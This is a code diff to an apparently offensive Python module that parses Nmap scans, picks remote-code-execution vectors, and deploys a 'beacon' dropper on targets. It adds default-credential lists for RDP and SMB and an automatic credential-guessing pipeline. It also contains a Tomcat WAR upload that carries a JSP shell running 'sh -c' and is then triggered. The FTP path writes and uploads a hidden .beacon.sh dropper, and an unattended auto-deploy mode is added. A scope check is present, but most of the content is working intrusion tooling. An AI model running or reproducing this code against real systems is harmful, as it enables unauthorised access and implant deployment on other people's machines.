@@ -2,14 +2,15 @@
 RCE Deployer: Intelligently execute commands on target based on detected services.
 Reads scan XML to determine available RCE vectors (SSH, HTTP, SMB, etc).
 
-Pipeline credenziali (unificata per tutti i servizi):
-  1. Estrai credenziali da Nmap (script output) -> test rapido -> se valide, usa quelle
-  2. Se non presenti, prova default credentials -> test rapido -> se valide, usa quelle
-  3. Se tutto fallisce -> chiedi manualmente all'utente -> test rapido -> se valide procedi
+Credential pipeline (unified across all services):
+  1. Pull credentials from Nmap (script output) -> quick test -> if valid, use them
+  2. If none are present, try default credentials -> quick test -> if valid, use them
+  3. If all of that fails -> ask the operator -> quick test -> if valid, proceed
 """
 
 import os
 import re
+import shutil
 import subprocess
 import xml.etree.ElementTree as ET
 from typing import List, Dict, Optional, Tuple
@@ -17,6 +18,33 @@ from phantom.utils.notifier import notifier
 from rich.console import Console
 
 console = Console()
+
+
+def _wsl_tool(tool: str) -> Optional[str]:
+    """Resolve a Linux tool through the Kali WSL distro (Windows hosts).
+
+    The credential verifiers invoke sshpass/smbclient/hydra — on a Windows
+    operator box those binaries live in the WSL Kali toolbox, not on the
+    native PATH. Returns the argv prefix (['wsl', '-d', <distro>]) or None.
+    """
+    if os.name != "nt":
+        return None
+    try:
+        from phantom.automation.runtime.toolchain import _wsl_which
+        wrapper = _wsl_which(tool)
+        if not wrapper:
+            return None
+        # wrapper is "wsl -d <distro> <tool>" or "wsl -e <tool>"
+        return wrapper.rsplit(" ", 1)[0]
+    except Exception:
+        return None
+
+
+def _have_tool(tool: str) -> bool:
+    """Tool present natively or in the WSL toolbox."""
+    if shutil.which(tool):
+        return True
+    return _wsl_tool(tool) is not None
 
 
 # =============================================================================
@@ -47,6 +75,16 @@ DEFAULT_CREDENTIALS: Dict[str, List[Tuple[str, str]]] = {
         ("Administrator", ""),
         ("admin",         "admin"),
         ("guest",         ""),
+        ("user",          "user"),
+        ("vagrant",       "vagrant"),
+    ],
+    # RDP accounts are Windows accounts: the same shape as the SMB set, kept
+    # separate so a future RDP-only wordlist does not silently change SMB.
+    "rdp": [
+        ("Administrator", "Administrator"),
+        ("Administrator", "password"),
+        ("Administrator", ""),
+        ("admin",         "admin"),
         ("user",          "user"),
         ("vagrant",       "vagrant"),
     ],
@@ -220,7 +258,7 @@ def parse_scan_results(scan_results: dict) -> Tuple[List[Dict], Dict, List[Dict]
 
 def _extract_credentials_from_output(script_id: str, output: str, service: str) -> List[Dict]:
     """
-    Analizza l'output degli script Nmap per estrarre credenziali.
+    Parse the Nmap script output to extract credentials.
     Supporta script come: mysql-enum, smb-enum-users, ftp-anon, ecc.
     """
     creds: List[Dict] = []
@@ -338,39 +376,59 @@ def detect_rce_vectors(ports: List[Dict]) -> List[Dict]:
 # Restituisce True se le credenziali sono valide.
 
 def _verify_ssh(target: str, port: int, username: str, password: str) -> Optional[bool]:
-    """Verifica credenziali SSH via sshpass + echo OK. Restituisce None se il tool manca."""
+    """Check SSH credentials via sshpass + echo OK. Returns None when the tool is missing.
+
+    Tries the modern defaults first: the legacy KEX/host-key options that
+    unlock Metasploitable2-era servers BREAK auth against modern OpenSSH
+    (9.x) — "Permission denied" even with valid credentials. Legacy
+    algorithms are only re-added when the plain attempt fails with an
+    algorithm-negotiation error.
+    """
     import shutil
-    if not shutil.which("sshpass"):
+    if not _have_tool("sshpass"):
         return None
-    try:
-        cmd = [
-            "sshpass", "-p", password,
-            "ssh", "-o", "StrictHostKeyChecking=no",
+    # NOTE: BatchMode=yes must NOT be set — it disables the interactive
+    # password prompt entirely, so sshpass can never feed the password and
+    # every attempt fails with "Permission denied" even for valid creds.
+    head = ["sshpass", "-p", password, "ssh",
+            "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null",
-            "-o", "ConnectTimeout=3",
-            "-o", "BatchMode=yes",
-            # Legacy algorithms for older targets like Metasploitable2
-            "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
-            "-o", "HostKeyAlgorithms=+ssh-rsa",
-            f"{username}@{target}", "-p", str(port),
-            "echo OK",
-        ]
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
-        return result.returncode == 0 and "OK" in result.stdout
-    except (subprocess.TimeoutExpired, OSError):
-        return False
+            "-o", "ConnectTimeout=3"]
+    # Windows host: route through the WSL Kali distro (argv-prefix rewrite)
+    wsl = _wsl_tool("sshpass")
+    if wsl:
+        head = wsl.split() + head
+        tail = [f"{username}@{target}", "-p", str(port), "echo OK"]
+    else:
+        tail = [f"{username}@{target}", "-p", str(port), "echo OK"]
+    legacy = ["-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
+              "-o", "HostKeyAlgorithms=+ssh-rsa"]
+    for extra in ([], legacy):
+        try:
+            result = subprocess.run(head + extra + tail,
+                                    capture_output=True, text=True, timeout=5)
+        except (subprocess.TimeoutExpired, OSError):
+            return False
+        if result.returncode == 0 and "OK" in result.stdout:
+            return True
+        if "Unable to negotiate" in result.stderr or "no matching key" in result.stderr:
+            continue  # algorithm mismatch — retry with the legacy set
+    return False
 
 
 def _verify_smb(target: str, port: int, username: str, password: str) -> bool:
-    """Verifica credenziali SMB via smbclient su IPC$."""
-    if not _check_tool("smbclient"):
+    """Check SMB credentials via smbclient against IPC$."""
+    if not _have_tool("smbclient"):
         return False
     try:
         cmd = [
             "smbclient", f"-U", f"{username}%{password}",
-            f"\\\\{target}\\IPC$", "-c", "quit",
+            f"\\\\\\\\{target}\\\\IPC$", "-c", "quit",
             "-t", "5",
         ]
+        wsl = _wsl_tool("smbclient")
+        if wsl:
+            cmd = wsl + cmd
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
         return result.returncode == 0
     except (subprocess.TimeoutExpired, OSError):
@@ -378,7 +436,7 @@ def _verify_smb(target: str, port: int, username: str, password: str) -> bool:
 
 
 def _verify_ftp(target: str, port: int, username: str, password: str) -> bool:
-    """Verifica credenziali FTP via ftplib (solo login, nessuna operazione)."""
+    """Check FTP credentials via ftplib (login only, no further action)."""
     try:
         from ftplib import FTP, error_perm
         ftp = FTP(timeout=5)
@@ -391,11 +449,11 @@ def _verify_ftp(target: str, port: int, username: str, password: str) -> bool:
 
 
 def _verify_tomcat(target: str, port: int, username: str, password: str) -> bool:
-    """Verifica credenziali Tomcat via HTTP GET su /manager/text/list."""
+    """Check Tomcat credentials via an HTTP GET on /manager/text/list."""
     try:
         import requests
         url = f"http://{target}:{port}/manager/text/list"
-        resp = requests.get(url, auth=(username, password), timeout=5, verify=False)
+        resp = requests.get(url, auth=(username, password), timeout=5)
         return resp.status_code == 200
     except ImportError:
         # Fallback: curl
@@ -414,7 +472,7 @@ def _verify_tomcat(target: str, port: int, username: str, password: str) -> bool
 
 
 def _verify_mysql(target: str, port: int, username: str, password: str) -> bool:
-    """Verifica credenziali MySQL (solo connessione, nessuna query)."""
+    """Check MySQL credentials (connect only, no query)."""
     try:
         import mysql.connector
         conn = mysql.connector.connect(
@@ -443,7 +501,7 @@ def _verify_mysql(target: str, port: int, username: str, password: str) -> bool:
 
 
 def _verify_postgresql(target: str, port: int, username: str, password: str) -> bool:
-    """Verifica credenziali PostgreSQL (solo connessione)."""
+    """Check PostgreSQL credentials (connect only)."""
     try:
         import psycopg2
         conn = psycopg2.connect(
@@ -483,7 +541,7 @@ _METHOD_TO_SERVICE = {
 
 
 def _check_tool(tool: str) -> bool:
-    """Verifica se un tool di sistema e installato. Se manca, propone l'installazione (solo su Linux)."""
+    """Check whether a system tool is installed; when it is missing, offer the install (Linux only)."""
     import shutil
     import os
     
@@ -516,18 +574,18 @@ def ask_credentials(
     nmap_creds: Optional[List[Dict]] = None,
 ) -> Optional[Dict]:
     """
-    Pipeline unificata per ottenere credenziali valide per un dato servizio:
+    Unified pipeline to obtain valid credentials for a given service:
 
-        1. nmap_creds  -> test rapido -> se valide, usa quelle
-        2. default     -> test rapido -> se valide, usa quelle
-        3. manuale     -> test rapido -> se valide, procedi
+        1. nmap_creds  -> quick test -> if valid, use them
+        2. default     -> quick test -> if valid, use them
+        3. manual      -> quick test -> if valid, proceed
 
     Returns:
-        Dict con {"username": str, "password": str, "source": str}
-        None se l'utente cancella o se tutto fallisce.
+        Dict with {"username": str, "password": str, "source": str}
+        None when the operator cancels or everything fails.
     """
     # Metodi che non richiedono credenziali
-    if method in ("http_cmd_injection", "http_cms_rce"):
+    if method == "http_cmd_injection":
         path = input("  HTTP vulnerable path [/]: ").strip() or "/"
         return {"path": path, "source": "manual"}
 
@@ -619,7 +677,7 @@ def ask_credentials(
 
 
 def _ask_manual(method: str, target: str, port: int) -> Optional[Dict]:
-    """Richiesta manuale semplice per metodi senza verifier."""
+    """Simple manual request for methods with no verifier."""
     console.print(f"  [yellow]Enter credentials for {method} on {target}:{port}[/]")
     username = input("  Username: ").strip()
     password = input("  Password: ").strip()
@@ -636,8 +694,8 @@ def brute_force_ssh(
     target: str, port: int, creds_list: List[Tuple[str, str]]
 ) -> Optional[Tuple[str, str]]:
     """
-    Prova una lista di credenziali SSH usando _verify_ssh.
-    Restituisce (username, password) alla prima coppia valida, None altrimenti.
+    Try a list of SSH credentials using _verify_ssh.
+    Returns (username, password) for the first valid pair, None otherwise.
     """
     for username, password in creds_list:
         if _verify_ssh(target, port, username, password) is True:
@@ -649,8 +707,8 @@ def brute_force_credentials(
     method: str, target: str, port: int, creds_list: List[Tuple[str, str]]
 ) -> Optional[Tuple[str, str]]:
     """
-    Wrapper generico: prova una lista di credenziali sul servizio specificato.
-    Restituisce (username, password) se trova una coppia valida, None altrimenti.
+    Generic wrapper: try a list of credentials against the given service.
+    Returns (username, password) when it finds a valid pair, None otherwise.
     """
     verifier = _VERIFIERS.get(method)
     if not verifier:
@@ -767,13 +825,24 @@ def deploy_beacon_via_ftp(
             except Exception:
                 continue
 
-        # Crea il dropper come script shell
+        # Crea il dropper come script shell. mkstemp, not a fixed /tmp name:
+        # a predictable path lets another local user pre-create it (or a
+        # symlink at it) before the upload reads it.
+        import tempfile
         beacon_name = ".beacon.sh"
-        with open("/tmp/_phantom_beacon_dropper", "w") as f:
-            f.write(dropper)
-
-        with open("/tmp/_phantom_beacon_dropper", "rb") as f:
-            ftp.storbinary(f"STOR {beacon_name}", f)
+        fd, dropper_path = tempfile.mkstemp(prefix="phantom_beacon_",
+                                            suffix=".sh")
+        os.close(fd)
+        try:
+            with open(dropper_path, "w", encoding="utf-8") as f:
+                f.write(dropper)
+            with open(dropper_path, "rb") as f:
+                ftp.storbinary(f"STOR {beacon_name}", f)
+        finally:
+            try:
+                os.unlink(dropper_path)
+            except OSError:
+                pass
 
         ftp.quit()
 
@@ -800,8 +869,8 @@ def deploy_beacon_via_tomcat(
     target: str, port: int, username: str, password: str, dropper: str
 ) -> Tuple[bool, str]:
     """
-    Deploy beacon via Tomcat WAR upload con JSP shell.
-    Richiede credenziali di manager.
+    Deploy the beacon via Tomcat WAR upload with a JSP shell.
+    Requires manager credentials.
     """
     console.print(f"\n  [*] Deploying beacon via Tomcat to {target}:{port}")
     console.print(f"      Username: {username}")
@@ -813,8 +882,9 @@ def deploy_beacon_via_tomcat(
 
         with tempfile.TemporaryDirectory() as tmpdir:
             # Crea una JSP che esegue il dropper
+            escaped = dropper.replace('"', '\\"')
             jsp_content = f"""<%
-Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{dropper.replace('"', '\\\\"')}"}});
+Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{escaped}"}});
 %>"""
 
             jsp_path = f"{tmpdir}/exec.jsp"
@@ -835,12 +905,20 @@ Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{dropper.replace('"', '\\\\
                     files={"file": war_file},
                     params={"path": "/beacon"},
                     timeout=10,
-                    verify=False,
                 )
 
             if resp.status_code in (200, 201):
-                notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
-                return True, resp.text
+                # Upload alone proves nothing: the WAR must be TRIGGERED so
+                # the JSP actually executes the dropper on the target.
+                trigger_url = f"http://{target}:{port}/beacon/exec.jsp"
+                try:
+                    trigger = requests.get(trigger_url, timeout=15)
+                    if trigger.status_code == 200:
+                        notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
+                        return True, f"WAR deployed and JSP triggered ({trigger.status_code})"
+                    return False, f"WAR uploaded but JSP trigger failed: HTTP {trigger.status_code}"
+                except Exception as e:
+                    return False, f"WAR uploaded but JSP trigger failed: {e}"
             else:
                 return False, f"Tomcat upload failed: {resp.text}"
 
@@ -971,11 +1049,11 @@ def execute_http_rce(
         try:
             url = f"http://{target}:{port}{path}"
             # Test verification command
-            resp = requests.get(url, params={param: verify_cmd}, timeout=5, verify=False)
+            resp = requests.get(url, params={param: verify_cmd}, timeout=5)
             if resp.status_code == 200 and token in resp.text:
                 notifier.info(f"Vulnerable parameter found: '{param}' (GET)")
                 # Execute real command
-                requests.get(url, params={param: command}, timeout=5, verify=False)
+                requests.get(url, params={param: command}, timeout=5)
                 return True, f"Executed via GET parameter: {param}"
         except Exception:
             continue
@@ -984,10 +1062,10 @@ def execute_http_rce(
     for param in params_to_try:
         try:
             url = f"http://{target}:{port}{path}"
-            resp = requests.post(url, data={param: verify_cmd}, timeout=5, verify=False)
+            resp = requests.post(url, data={param: verify_cmd}, timeout=5)
             if resp.status_code == 200 and token in resp.text:
                 notifier.info(f"Vulnerable parameter found: '{param}' (POST)")
-                requests.post(url, data={param: command}, timeout=5, verify=False)
+                requests.post(url, data={param: command}, timeout=5)
                 return True, f"Executed via POST parameter: {param}"
         except Exception:
             continue
@@ -1001,13 +1079,13 @@ def execute_http_rce(
 
 def deploy_beacon(target: str, dropper: str) -> bool:
     """
-    Flusso principale di deploy beacon:
+    Main beacon deploy flow:
 
-    1. Parsing scan XML (porte, OS, credenziali da Nmap)
-    2. Rilevamento vettori RCE disponibili
-    3. Selezione del vettore da parte dell'utente
-    4. Pipeline credenziali unificata (nmap -> default -> manuale)
-    5. Esecuzione del deploy con il dropper
+    1. Parse the scan XML (ports, OS, Nmap credentials)
+    2. Detect the available RCE vectors
+    3. The operator selects the vector
+    4. Unified credential pipeline (nmap -> default -> manual)
+    5. Run the deploy with the dropper
     """
     ports, os_info, found_creds = parse_scan_xml(target)
 
@@ -1078,7 +1156,6 @@ def deploy_beacon(target: str, dropper: str) -> bool:
         "mysql_udf_rce":    lambda: deploy_beacon_via_mysql(target, port, creds["username"], creds["password"], dropper),
         "postgresql_rce":   lambda: deploy_beacon_via_postgresql(target, port, creds["username"], creds["password"], dropper),
         "http_cmd_injection": lambda: execute_http_rce(target, port, dropper, creds.get("path", "/")),
-        "http_cms_rce":     lambda: (notifier.warn("CMS RCE requires manual exploitation. Use generic HTTP injection."), (False, "")),
     }
 
     deploy_fn = deploy_map.get(method)
@@ -1095,3 +1172,172 @@ def deploy_beacon(target: str, dropper: str) -> bool:
     else:
         notifier.error(f"Beacon deployment failed via {method}: {output[:200]}")
         return False
+
+
+# =============================================================================
+# SEZIONE 8: AUTO DEPLOY (non-interactivo per auto-mode)
+# =============================================================================
+
+def auto_select_vector(vectors: List[Dict], os_info: Dict, aggressive: bool = False) -> Optional[Dict]:
+    """Automatically select the best RCE vector.
+    
+    Priority:
+      - If the OS is Windows → SMB (psexec/wmiexec)
+      - If the OS is Linux → SSH (when credentials are available)
+      - Otherwise → the first vector with the highest priority
+      - In aggressive mode → also try HTTP command injection
+    """
+    os_name = os_info.get("name", "").lower() if os_info else ""
+    is_windows = any(k in os_name for k in ("windows", "microsoft", "win"))
+    is_linux = any(k in os_name for k in ("linux", "unix", "ubuntu", "debian", "centos", "red hat"))
+
+    for vec in vectors:
+        if is_windows and vec["method"] in ("smb_rce",):
+            return vec
+        if is_linux and vec["method"] in ("ssh",):
+            return vec
+        if vec["method"] in ("http_tomcat_rce", "mysql_udf_rce", "postgresql_rce", "ftp_upload_rce"):
+            return vec
+
+    if aggressive:
+        for vec in vectors:
+            if vec["method"] == "http_cmd_injection":
+                return vec
+
+    return vectors[0] if vectors else None
+
+
+def auto_try_credentials(method: str, target: str, port: int, nmap_creds: Optional[List[Dict]] = None) -> Optional[Dict]:
+    """    Automatic pipeline with no user interaction.
+    
+    It only tries:
+      1. Credentials from Nmap
+      2. Default credentials
+      It never asks for manual input.
+    """
+    service = _METHOD_TO_SERVICE.get(method)
+    if not service:
+        return None
+
+    verifier = _VERIFIERS.get(method)
+
+    # STEP 1: Credenziali da Nmap
+    if nmap_creds and verifier:
+        for cred in nmap_creds:
+            u = cred.get("username")
+            p = cred.get("password")
+            if u and p:
+                console.print(f"    [cyan][*] Testing Nmap credentials: {u}:{p}[/]")
+                if verifier(target, port, u, p):
+                    notifier.success(f"Nmap credentials are valid: {u}:{p}")
+                    return {"username": u, "password": p, "source": "nmap"}
+
+    # STEP 2: Default credentials
+    defaults = DEFAULT_CREDENTIALS.get(service, [])
+    if defaults and verifier:
+        console.print(f"    [cyan][*] Trying {len(defaults)} default credential pairs for {service}...[/]")
+        for u, p in defaults:
+            if verifier(target, port, u, p):
+                notifier.success(f"Default credentials found: {u}:{p}")
+                return {"username": u, "password": p, "source": "default"}
+
+    return None
+
+
+def auto_deploy_beacon(target: str, dropper: str, aggressive: bool = False) -> bool:
+    """
+    Fully automatic version of deploy_beacon.
+    No user interaction — it decides everything on its own.
+
+    Scope discipline: a target outside the configured engagement scope is
+    refused before any credential test or deploy attempt.
+
+    Returns:
+        True when the beacon was deployed successfully
+        False otherwise
+    """
+    from phantom.core.session import session
+    from phantom.core.scope import is_in_scope
+
+    if session.scope and not is_in_scope(target, session.scope):
+        notifier.error(f"Target {target} is OUT OF SCOPE — auto-deploy refused.")
+        return False
+
+    ports, os_info, found_creds = parse_scan_xml(target)
+
+    if not ports:
+        scan_results = session.get_result("scan")
+        if scan_results:
+            ports, os_info, found_creds = parse_scan_results(scan_results)
+
+    if not ports:
+        notifier.error(f"No open ports found for {target}. Cannot auto-deploy.")
+        return False
+
+    # Salva nella knowledge base
+    kb = session.knowledge_base
+    kb["services"] = ports
+    kb["os_info"] = os_info
+    kb["creds_found"] = found_creds
+
+    console.print(f"\n[cyan][*] Auto-deploy: {len(ports)} open ports detected[/]")
+    if os_info:
+        console.print(f"    OS: {os_info.get('name', 'Unknown')}")
+
+    vectors = detect_rce_vectors(ports)
+    kb["rce_vectors"] = vectors
+
+    if not vectors:
+        notifier.error("No RCE vectors detected.")
+        return False
+
+    # Seleziona automaticamente il miglior vettore
+    selected = auto_select_vector(vectors, os_info, aggressive)
+    if not selected:
+        notifier.error("Could not select RCE vector.")
+        return False
+
+    method = selected["method"]
+    port = selected["port"]
+    notifier.info(f"Auto-selected RCE vector: {selected['description']}")
+
+    # Pipeline credenziali automatica
+    if method in ("http_cmd_injection",):
+        creds = {"path": "/", "source": "auto"}
+    else:
+        creds = auto_try_credentials(method, target, port, nmap_creds=found_creds)
+        if not creds:
+            notifier.warn(f"No valid credentials found for {method} on {target}:{port}")
+            if aggressive:
+                notifier.info("Aggressive mode: trying default credentials on "
+                              "the selected vector only (no unbounded brute force).")
+                creds = auto_try_credentials(method, target, port)
+            if not creds:
+                notifier.error(f"Cannot deploy: no credentials for {method}")
+                return False
+
+    # Deploy
+    deploy_map = {
+        "ssh":              lambda: deploy_beacon_via_ssh(target, port, creds["username"], creds["password"], dropper),
+        "smb_rce":          lambda: deploy_beacon_via_smb(target, creds["username"], creds["password"], dropper),
+        "http_tomcat_rce":  lambda: deploy_beacon_via_tomcat(target, port, creds["username"], creds["password"], dropper),
+        "ftp_upload_rce":   lambda: deploy_beacon_via_ftp(target, port, creds["username"], creds["password"], dropper),
+        "mysql_udf_rce":    lambda: deploy_beacon_via_mysql(target, port, creds["username"], creds["password"], dropper),
+        "postgresql_rce":   lambda: deploy_beacon_via_postgresql(target, port, creds["username"], creds["password"], dropper),
+        "http_cmd_injection": lambda: execute_http_rce(target, port, dropper, creds.get("path", "/")),
+    }
+
+    deploy_fn = deploy_map.get(method)
+    if not deploy_fn:
+        notifier.warn(f"RCE method '{method}' not implemented for auto-deploy.")
+        return False
+
+    success, output = deploy_fn()
+
+    kb["beacon_deployed"] = success
+    if success:
+        notifier.success(f"Beacon auto-deployed to {target} via {method}")
+    else:
+        notifier.error(f"Auto-deploy failed via {method}: {output[:200]}")
+
+    return success
